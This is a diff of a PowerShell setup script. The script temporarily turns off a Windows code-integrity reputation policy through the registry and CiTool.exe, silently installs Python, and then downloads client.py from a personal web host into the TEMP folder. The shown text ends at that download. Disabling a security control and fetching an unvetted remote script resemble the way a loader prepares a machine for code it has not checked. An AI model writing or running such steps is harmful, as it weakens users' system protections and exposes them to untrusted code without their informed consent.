@@ -1,14 +1,14 @@
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value "0"
-" `n" | CiTool.exe -r
 $pythonCmd = Get-Command python -ErrorAction SilentlyContinue
 if (-not $pythonCmd) {
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value "0"
+    " `n" | CiTool.exe -r
     $pythonUrl = "https://www.python.org/ftp/python/3.14.4/python-3.14.4-amd64.exe"
     $pythonInstaller = "$env:TEMP\python-3.14.4-amd64.exe"    
     Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller
     Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
     $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" +
                 [System.Environment]::GetEnvironmentVariable("Path","User")}
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value "1"
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value "1"
 $scriptUrl = "https://ryder7223.hrsn.dev/raw/client.py"
 $scriptPath = "$env:TEMP\client.py"
 Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
